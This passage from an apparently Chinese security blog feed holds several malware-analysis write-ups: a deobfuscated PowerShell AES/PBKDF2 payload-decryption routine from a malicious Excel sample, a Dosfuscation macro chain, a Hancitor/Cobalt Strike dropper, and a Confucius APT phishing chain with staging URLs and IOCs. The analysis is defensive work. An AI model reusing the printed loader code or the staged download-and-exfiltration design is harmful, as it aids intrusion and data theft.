class="title">OtTAsS</span></span> &#123;<span class="keyword">param</span> ([<span class="built_in">String</span>]<span class="variable">$</span>&#123;IgAa&#125;, [<span class="built_in">String</span>]<span class="variable">$</span>&#123;pcxC&#125;)<span class="variable">$</span>&#123;byTuRo&#125; = [<span class="type">Convert</span>]::<span class="string">&quot;FROmBASe64string&quot;</span>(<span class="variable">$</span>&#123;IGAA&#125;);</span><br><span class="line"><span class="variable">$</span>&#123;TlAS&#125; = &amp;(<span class="string">&#x27;Om&#x27;</span>) bYtE[](<span class="number">32</span>);[<span class="built_in">Array</span>]::<span class="string">&quot;CoPy&quot;</span>(<span class="variable">$</span>&#123;bYTuRo&#125;, <span class="number">0</span>, <span class="variable">$</span>&#123;TLaS&#125;, <span class="number">0</span>, <span class="number">32</span>);</span><br><span class="line"><span class="variable">$</span>&#123;rcxz0&#125; = .(<span class="string">&#x27;Om&#x27;</span>) SystEM.sEcURITY.cRyptOgRAPhY.RfC2898deRIVeBYtEs(<span class="variable">$</span>&#123;PCxc&#125;,<span class="variable">$</span>&#123;tLAS&#125;);</span><br><span class="line"><span class="variable">$</span>&#123;Xa2d&#125; = <span class="variable">$</span>&#123;rCxZ0&#125;.<span class="string">&quot;GEtBYTES&quot;</span>(<span class="number">32</span>);</span><br><span class="line"><span class="variable">$</span>&#123;DEfS&#125; = <span class="variable">$</span>&#123;Rcxz0&#125;.<span class="string">&quot;geTbyTES&quot;</span>(<span class="number">16</span>);</span><br><span class="line"><span class="variable">$</span>&#123;HmaC&#125; = .(<span class="string">&#x27;Om&#x27;</span>) sYsTEM.sEcUrItY.CRYPtOgRapHY.HMAcSHA1(,<span class="variable">$</span>&#123;rcxz0&#125;.<span class="string">&quot;getBYtes&quot;</span>(<span class="number">20</span>));</span><br><span class="line"><span class="variable">$</span>&#123;eedER&#125; = <span class="variable">$</span>&#123;hMAc&#125;.<span class="string">&quot;compuTehAsh&quot;</span>(<span class="variable">$</span>&#123;bytuRO&#125;, <span class="number">52</span>, <span class="variable">$</span>&#123;BYTURO&#125;.<span class="string">&quot;LeNGTh&quot;</span> - <span class="number">52</span>);</span><br><span class="line"><span class="keyword">IF</span> (&amp;<span class="string">&#x27;Compare-Object&#x27;</span> <span class="variable">$</span>&#123;eeDER&#125; (<span class="variable">$</span>&#123;byTUrO&#125;[<span class="number">32</span><span class="type">..51</span>]) <span class="literal">-SyncWindow</span> <span class="number">0</span>) &#123;<span class="keyword">throw</span> <span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line"><span class="variable">$</span>&#123;Aes&#125; = .(<span class="string">&#x27;Om&#x27;</span>) sECuRITY.CryPTOgRapHY.rijnDAelMANAgED;</span><br><span class="line"><span class="variable">$</span>&#123;QAsAq&#125; = <span class="variable">$</span>&#123;aES&#125;.<span class="string">&quot;cREATeDeCRYPTOr&quot;</span>(<span class="variable">$</span>&#123;XA2D&#125;, <span class="variable">$</span>&#123;deFS&#125;);</span><br><span class="line"><span class="variable">$</span>&#123;MJOkO&#125; = <span class="variable">$</span>&#123;QasAq&#125;.<span class="string">&quot;TRaNsFoRmfINALbLOCK&quot;</span>(<span class="variable">$</span>&#123;bYTUro&#125;, <span class="number">52</span>, <span class="variable">$</span>&#123;BYTuRO&#125;.<span class="string">&quot;lenGtH&quot;</span> - <span class="number">52</span>);</span><br><span class="line"><span class="variable">$</span>&#123;adAmi&#125; = .(<span class="string">&#x27;Om&#x27;</span>) System.Io.meMOrYSTream(<span class="variable">$</span>&#123;MJOkO&#125;, <span class="variable">$</span>&#123;FalSE&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">IF</span> (<span class="variable">$</span>&#123;mjoKO&#125;[<span class="number">0</span>] <span class="operator">-eq</span> <span class="number">0</span>x1f) </span><br><span class="line">&#123;<span class="variable">$</span>&#123;aDaMi&#125; = &amp;(<span class="string">&#x27;Om&#x27;</span>) SYsTEM.IO.cOMpRessION.gZIpStReAm(<span class="variable">$</span>&#123;adami&#125;, [<span class="type">IO.Compression.CompressionMode</span>]::<span class="string">&quot;DEcomPrESS&quot;</span>)&#125;</span><br><span class="line"><span class="variable">$</span>&#123;sTREAMreadEr&#125; = &amp;(<span class="string">&#x27;Om&#x27;</span>) sYsTEM.iO.sTrEaMReadEr(<span class="variable">$</span>&#123;aDAmI&#125;, <span class="variable">$</span>&#123;TRUe&#125;);</span><br><span class="line"><span class="variable">$</span>&#123;sTrEAmrEaDeR&#125;.<span class="string">&quot;REAdtOeND&quot;</span>()&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">Function</span> <span class="title">bAvV</span><span class="params">(<span class="variable">$</span>&#123;t64IN&#125;)</span></span>&#123;<span class="variable">$</span>&#123;bCzA&#125;  = [<span class="type">System.Convert</span>]::<span class="string">&quot;frOmbASe64StrINg&quot;</span>(<span class="variable">$</span>&#123;T64<span class="keyword">iN</span>&#125;);</span><br><span class="line"><span class="variable">$</span>&#123;SeNegS&#125; = [<span class="type">System.Text.Encoding</span>]::<span class="string">&quot;uTf8&quot;</span>.<span class="string">&quot;gETSTring&quot;</span>(<span class="variable">$</span>&#123;bCzA&#125;);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$</span>&#123;SeneGS&#125;&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$Fghg</span>= <span class="number">408</span> + <span class="number">1041</span>;</span><br><span class="line"><span class="variable">$r44r</span>=Ottass <span class="literal">-Igaa</span> <span class="variable">$MmUz</span> <span class="literal">-Pcxc</span> <span class="variable">$Fghg</span>;</span><br><span class="line"><span class="variable">$OkKiiS</span>=Bavv(<span class="variable">$r44r</span>);</span><br><span class="line"><span class="variable">$OkKiiS</span></span><br></pre></td></tr></table></figure><p>成功输出为powershell脚本</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/image-20220107152345760.png" alt="image-20220107152345760"></p><p>继续分析powershell脚本输出后的这一部分</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/image-20220107152454491.png" alt="image-20220107152454491"></p><p><code>|&amp; ((GET-VAriAbLe &#39;*mdR*&#39;).NaMe[3,11,2]-JOIn&#39;&#39;)</code>这部分字符串表示为iex，删除即可</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/image-20220107152658501.png" alt="image-20220107152658501"></p><p>解除混淆后为powershell内容，与之前看到的类似</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/image-20220107152742183.png" alt="image-20220107152742183"></p><p>继续去其混淆</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/image-20220107154143439.png" alt="image-20220107154143439"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/image-20220107154221330.png" alt="image-20220107154221330"></p><p>最后又是下载图片文件</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/image-20220107154254927.png" alt="image-20220107154254927"></p><p>手工去其混淆如下原理</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/image-20220107155454055.png" alt="image-20220107155454055"></p><p>或可使用工具 PSUnveil</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/image-20220107160158896.png" alt="image-20220107160158896"></p><p>继续修改脚本，可看到提取的结果被传递给值 ${MAGG}。输出${MAGG}即可。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/image-20220107155024438.png" alt="image-20220107155024438"></p><p>输出为base64</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/image-20220107160110119.png" alt="image-20220107160110119"></p><p>将首先获取系统的 LCID 并将数值转换为字符串，然后将字符串转换为 Char，接下来把从图片文件中提取的base64字符串，Base64解码成一个字节数组。最后，它将通过 LCID值为1041对数据进行xor。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/image-20220107160150814.png" alt="image-20220107160150814"></p><p>继续进行解码的到一个可执行文件</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/image-20220107143012009.png" alt="image-20220107143012009"></p><p>一个dll文件</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/image-20220107160534332.png" alt="image-20220107160534332"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/image-20220107160611099.png" alt="image-20220107160611099"></p><p>参考链接：</p><p><a href="https://www.kahusecurity.com/tools.html">https://www.kahusecurity.com/tools.html</a></p><p><a href="https://pcsxcetrasupport3.wordpress.com/2021/12/07/peeling-away-the-layers-of-obfuscation-from-excel-vba-to-dll/">https://pcsxcetrasupport3.wordpress.com/2021/12/07/peeling-away-the-layers-of-obfuscation-from-excel-vba-to-dll/</a></p><p><a href="https://docs.microsoft.com/en-us/openspecs/office_standards/ms-oe376/6c085406-a698-4e12-9d4d-c3b0ee3dbc4a">https://docs.microsoft.com/en-us/openspecs/office_standards/ms-oe376/6c085406-a698-4e12-9d4d-c3b0ee3dbc4a</a></p>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
          <category> 恶意样本分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> 恶意样本分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>obfuscation_from_Excel_VBA_Part1</title>
      <link href="/obfuscation-from-Excel-VBA.html"/>
      <url>/obfuscation-from-Excel-VBA.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/python-bundle-can-teach-you-everything-you-need-know.1280x600.jpg"></p><span id="more"></span><p>查看文档，看到有禁用宏的警告<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/doc-1_thumb.png"></p><p>使用oletools剥离出宏代码<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1641473629299.png"></p><p>简单的可以看出多个十六进制拼接后转为字符串后执行。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1641473666508.png"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/doc-6-b.png"></p><p>简单的整理拼接后</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1641474311645.png"></p><p>输出十六进制</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1641474498666.png"></p><p>转char字符串，将十六进制解码为字符串后，我们现在发现我们面临一个 PowerShell 脚本，该脚本是 Invoke Dosfuscation ，经过混淆。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1641474595093.png"><br>可参考以下原理和链接<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1641475928987.png"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1641477148175.png"></p><p><a href="https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/dosfuscation-report.pdf">https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/dosfuscation-report.pdf</a></p><p><a href="https://i.blackhat.com/briefings/asia/2018/asia-18-bohannon-invoke_dosfuscation_techniques_for_fin_style_dos_level_cmd_obfuscation.pdf">https://i.blackhat.com/briefings/asia/2018/asia-18-bohannon-invoke_dosfuscation_techniques_for_fin_style_dos_level_cmd_obfuscation.pdf</a></p><p>参考以上把call改为echo<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1641477516560.png"></p><p>输出以下红框处。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1641477695198.png"></p><p>代码整理后如下：<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1641477805668.png"></p><p>还有一层混淆，将其修改为以下powershell代码将其base64代入：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$base64data</span> = <span class="string">&quot;insert compressed and base64 data here&quot;</span></span><br><span class="line"><span class="variable">$data</span> = [<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$base64data</span>)</span><br><span class="line"><span class="variable">$ms</span> = <span class="built_in">New-Object</span> System.IO.MemoryStream</span><br><span class="line"><span class="variable">$ms</span>.Write(<span class="variable">$data</span>, <span class="number">0</span>, <span class="variable">$data</span>.Length)</span><br><span class="line"><span class="variable">$ms</span>.Seek(<span class="number">0</span>,<span class="number">0</span>) | <span class="built_in">Out-Null</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$sr</span> = <span class="built_in">New-Object</span> System.IO.StreamReader(<span class="built_in">New-Object</span> System.IO.Compression.DeflateStream(<span class="variable">$ms</span>, [<span class="type">System.IO.Compression.CompressionMode</span>]::Decompress))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$line</span> = <span class="variable">$sr</span>.ReadLine()) &#123;  </span><br><span class="line">    <span class="variable">$line</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1641478185560.png"><br>执行后再次得到dos混淆</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1641478230228.png"><br>大体可以看到下载文件进行执行解密等操作</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1641478328293.png"></p><p><a href="https://pcsxcetrasupport3.wordpress.com/2021/12/07/peeling-away-the-layers-of-obfuscation-from-excel-vba-to-dll/">https://pcsxcetrasupport3.wordpress.com/2021/12/07/peeling-away-the-layers-of-obfuscation-from-excel-vba-to-dll/</a></p><p><a href="https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/dosfuscation-report.pdf">https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/dosfuscation-report.pdf</a></p><p><a href="https://i.blackhat.com/briefings/asia/2018/asia-18-bohannon-invoke_dosfuscation_techniques_for_fin_style_dos_level_cmd_obfuscation.pdf">https://i.blackhat.com/briefings/asia/2018/asia-18-bohannon-invoke_dosfuscation_techniques_for_fin_style_dos_level_cmd_obfuscation.pdf</a></p><p><a href="https://www.filescan.io/uploads/61a2d7a9effcae2254f2cacb/reports/b584f955-81c0-49b3-9c10-c371712e2b0a/overview">https://www.filescan.io/uploads/61a2d7a9effcae2254f2cacb/reports/b584f955-81c0-49b3-9c10-c371712e2b0a/overview</a></p>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
          <category> 恶意样本分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> 恶意样本分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HANCITOR_WITH_COBALT_STRIKE</title>
      <link href="/HANCITOR-WITH-COBALT-STRIKE.html"/>
      <url>/HANCITOR-WITH-COBALT-STRIKE.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/use-msfconsoles-generate-command-obfuscate-payloads-evade-antivirus-detection.1280x600.jpg"></p><span id="more"></span><p>下载大神抓到的样本与流量。点开查看邮件，与流量包。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1634437579658.png"><br>邮件中下载doc，而使用olevba对doc分析宏，而宏中加载了dll，也就是说rundll32 kikus.dll,GBSLWSDVGOE。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1634437081531.png"><br>同时可以看到该文档隐藏了一个对象。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1634438360548.png"><br>拖到x32dbg中进行动态分析第一个阶段的payload。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1634434181044.png"><br>下几个断点。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1634432744916.png"><br>断到断点处进过几次的对EAX内存转储，可以看到像MZ一样的头。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1634433951527.png"><br>往下走点就可以看到真正的pe头文件了。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1634432706390.png"><br>保存转储后的文件，第二个阶段的payload。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1634434063443.png"><br>丢到010编辑器中，并搜索4d 5a，发现在436fh中。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1634434402890.png"><br>将其余前面部分删除。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1634434477817.png"><br>拖到pestudio中，可以在导出表中看到真正的函数入口点。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1634434554610.png"><br>拖到IDA中，找到函数入口。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1634434781078.png"><br>进入sub_10001870函数。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1634439597489.png"><br>sub_10001AA0获取计算机信息，获取外网ip，发送c2服务器。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1634439708507.png"><br>sub_100025B0函数复制一些字符串。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1634436768608.png"><br>sub_10002CD0函数。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1634435668717.png"><br>第二个阶段的payload重新拖到x32dbg中，设置sub_100025B0和sub_10002CD0的虚拟地址为断点，断到断点处在eax中对其进行内存转储。发现转储的内容为下图几个地址。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1634436961174.png"><br>并可以看到对其往外发送本计算机的信息。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1634437015162.png"><br>在流量包中可以看到HANCITOR C2 流量。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1634437361292.png"><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1634437452980.png"><br>COBALT STRIKE HANCITOR 流量<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1634437733547.png"><br>COBALT STRIKE 流量<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1634437860573.png"></p><p>参考链接：<a href="https://www.malware-traffic-analysis.net/2021/06/17/index.html">https://www.malware-traffic-analysis.net/2021/06/17/index.html</a></p>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
          <category> 恶意样本分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> 恶意样本分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>魔罗桫组织与 Pegasus 间谍软件</title>
      <link href="/Confucius.html"/>
      <url>/Confucius.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/learn-c-start-designing-games-apps.1280x600.jpg"></p><span id="more"></span><h2 id="1-起源"><a href="#1-起源" class="headerlink" title="1.起源"></a>1.起源</h2><p>APT组织”魔罗桫”（又名为Confucius），是一个长期针对中国，巴基斯坦，尼泊尔等地区，主要瞄准政府机构，军工企业，核能行业等领域进行网络间谍活动的活跃组织。</p><p>此类恶意文档主要通过钓鱼邮件进行传播，用户打开该恶意文档后，显示的是看似正常的相关报告，背后会通过office宏从黑客的服务端下载恶意文件并隐蔽执行，最终受害用户计算机被黑客组织控制，资料被窃取。恶意word文件打开后实际内容如下。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1632179901761.png"><br>该活动涉及两步攻击。在第一阶段，向目标发送一封没有恶意负载的电子邮件，其中包含从合法的巴基斯坦报纸文章中复制的内容。伪造的发件人地址冒充巴基斯坦武装部队的公关部门 。</p><p>两天后，第二封电子邮件（据称是巴基斯坦军方关于 Pegasus 间谍软件的警告）将发送给目标，其中包含指向恶意加密 Word 文档的 <code>cutt.ly </code>链接和解密密码。发件人地址模拟了类似于第一封电子邮件上的服务。<br>如果目标点击链接或“取消订阅”链接，它将从 parinari[.]xyz 域下载 Word 文档。<br>这些电子邮件要么从巴基斯坦的 ExpressVPN 出口节点发送，要么从攻击者控制下的邮件服务器发送。<br>检查包含宏的加密文档<br>输入消息中提到的密码后，屏幕上会显示包含宏的文档。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1632179787599.png"></p><h2 id="2-攻击流程"><a href="#2-攻击流程" class="headerlink" title="2.攻击流程"></a>2.攻击流程</h2><p>打开文档后在临时目录中创建了一个名为 skfk.txt 的 .NET DLL 文件，其中填充了文档“Comments”属性中的内容。然后通过 PowerShell 将文件加载到内存中。</p><p>第 1 阶段是一个简单的下载和执行程序。它从同一个域下载一个 ASCII 文件并将其转换为二进制文件，然后将其加载到内存中并跳转到一个动态函数。</p><p>第 2 阶段也是 .NET DLL 文件，它从 parinari[.]xyz 下载第三个文件，将其从 ASCII 转换为二进制，然后创建一个计划任务来加载它。</p><p>第 3 阶段类似于第 1 阶段，唯一的变化是检索下一阶段的 URL。</p><p>第 4 阶段是最终的payload，它永远不会以明文形式写入文件磁盘。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/Confucius.jpg" alt="流程图"></p><h2 id="3-第一阶段"><a href="#3-第一阶段" class="headerlink" title="3. 第一阶段"></a>3. 第一阶段</h2><p>powershell 内存加载解码skfk.txt。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1632183088705.png"><br>skfk.txt内容在备注这一段，转为二进制进行加载。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1632183165539.png"><br>转为二进制的文件<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1632183310714.png"><br>拖到pestudio可以看到二进制文件是C#写的DLL文件文件名为Tysdf.dll<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1632183446025.png"><br>拖dnspy反编译工具下可以看到该DLL的功能是下载<code>https://parinari.xyz/SowpnTdb.txt</code>第二阶段的文件进行内存加载。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1632183689778.png"></p><h2 id="4-第二阶段"><a href="#4-第二阶段" class="headerlink" title="4. 第二阶段"></a>4. 第二阶段</h2><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1632183903672.png"></p><h2 id="5-第三阶段"><a href="#5-第三阶段" class="headerlink" title="5. 第三阶段"></a>5. 第三阶段</h2><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1632183973915.png"></p><h2 id="6-第四阶段"><a href="#6-第四阶段" class="headerlink" title="6. 第四阶段"></a>6. 第四阶段</h2><p>最终有效载荷是一个 .NET DLL 文件，旨在窃取具有以下扩展名的文档和图像：<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1632184465255.png"><br>检查每个用户的“文档”、“下载”、“桌面”和“图片”文件夹。DLL 文件还会检查 C: 以外的驱动器。</p><p>当找到与所列扩展名之一匹配的文件时，将计算其 MD5 哈希值并将其与从命令和控制 (C&amp;C) 服务器 pirnaram[.]xyz 检索到的排除列表进行比较。</p><p>如果未列出哈希，则该文件将通过 C&amp;C 发送到以机器名称和用户名的串联命名的目录。每个机器名称-用户名字符串的排除列表都不同。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1632184522858.png"></p><h2 id="7-IOC"><a href="#7-IOC" class="headerlink" title="7. IOC"></a>7. IOC</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Main</span> object - <span class="string">&quot;decrypted-Alert#6285.docx&quot;</span>  </span><br><span class="line"> <span class="title class_">SHA256</span> 1FD861DB97C66B27620108C8227CB09225B6EE70818E73ECB659C317FF005B64 </span><br><span class="line"> </span><br><span class="line"> <span class="title class_">SHA1</span> 50F10AB1CAC45C9C6DA93C027557046A1D1984C0 </span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> <span class="title class_">MD5</span> 47CBF19AF54979B0B8461E8CE2E832EE </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="title class_">Dropped</span> executable file  </span><br><span class="line"></span><br><span class="line"> <span class="title class_">SHA256</span> <span class="attr">C</span>:\<span class="title class_">Users</span>\admin\<span class="title class_">AppData</span>\<span class="title class_">Local</span>\<span class="title class_">Temp</span>\skfk.<span class="property">txt</span></span><br><span class="line"> </span><br><span class="line">7E3349C6DC753CD5B5AE5D89D4F4952838D31E4780DD2872CC0C6AE8B962CADA </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">第一阶段<span class="variable constant_">DLL</span></span><br><span class="line"><span class="title class_">SHA256</span> <span class="attr">hash</span>: 7e3349c6dc753cd5b5ae5d89d4f4952838d31e4780dd2872cc0c6ae8b962cada</span><br><span class="line"></span><br><span class="line"><span class="title class_">SHA3</span>-<span class="number">384</span> <span class="attr">hash</span>: 42fcb2df6376636e3dbea9236cdd768eacea50771fdab42ec5971310dce3bddd9c311b68090f5ec8771aa83a39688233</span><br><span class="line"></span><br><span class="line"><span class="title class_">SHA1</span> <span class="attr">hash</span>: 782ac9aa349761133f2d23c5bc85154015f83552</span><br><span class="line"></span><br><span class="line"><span class="title class_">MD5</span> <span class="attr">hash</span>: 43c16a3c557cadce8a74c418e683a32b</span><br><span class="line"></span><br><span class="line"><span class="title class_">File</span> <span class="attr">name</span>:skfk.<span class="property">txt</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">第二阶段<span class="variable constant_">DLL</span></span><br><span class="line"><span class="title class_">SHA256</span> <span class="attr">hash</span>: 63ca532a13ff909b4b7f72b9a094fa3fc59713984f645664c95a66f14be5f96a</span><br><span class="line"></span><br><span class="line"><span class="title class_">SHA3</span>-<span class="number">384</span> <span class="attr">hash</span>: 304115c758244ca546ea7d068d2417b7129a4f23244e0e2865f47cbda4330497a58df513e02a8ebc6f53227e6ca7c82f</span><br><span class="line"></span><br><span class="line"><span class="title class_">SHA1</span> <span class="attr">hash</span>: 33596fbe26e556bb2610739f070b66a2cf532eda</span><br><span class="line"></span><br><span class="line"><span class="title class_">MD5</span> <span class="attr">hash</span>: 4461412acfc3988974355d4c1601d3f6</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">第三阶段<span class="variable constant_">DLL</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">SHA256</span> <span class="attr">hash</span>: f10541d934aa04fdd82839b1d1767489191fcecc6026ca5e12a19e9c84562b19</span><br><span class="line"></span><br><span class="line"><span class="title class_">SHA3</span>-<span class="number">384</span> <span class="attr">hash</span>: 0de64dce3576c1705d4da6bbd02753ce586858b54c2735a944756a79fbf77b0f4c722f48d37b2875e127fe11b804955d</span><br><span class="line"></span><br><span class="line"><span class="title class_">SHA1</span> <span class="attr">hash</span>: 7ff732a7361234eef8b340816cdd782d21c84c53</span><br><span class="line"></span><br><span class="line"><span class="title class_">MD5</span> <span class="attr">hash</span>: 8696a6256cb49aa1527d74f175346594</span><br><span class="line"></span><br><span class="line"><span class="title class_">File</span> <span class="attr">name</span>:<span class="title class_">Msdjkfh</span>.<span class="property">bin</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">第四阶段<span class="variable constant_">DLL</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">SHA256</span> <span class="attr">hash</span>: 43698d70087aa875c4384b59cacd8eff56bd0bff3be20e69b98613ec5184b41f</span><br><span class="line"></span><br><span class="line"><span class="title class_">SHA3</span>-<span class="number">384</span> <span class="attr">hash</span>: </span><br><span class="line">dd193b7091679d69fdd33ddb20a13702b70604e8eac078473a867548ed2893b2e820ba9860f2c29487f66680ba784874</span><br><span class="line"></span><br><span class="line"><span class="title class_">SHA1</span> <span class="attr">hash</span>: e554c0ef069fe5a49919bea560003cfccd69f858</span><br><span class="line"></span><br><span class="line"><span class="title class_">MD5</span> <span class="attr">hash</span>: 457101ea5c30c53f9381d7e9aa6432a4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">托管恶意文档的服务器</span><br><span class="line"></span><br><span class="line">parinari[.]xyz</span><br><span class="line"></span><br><span 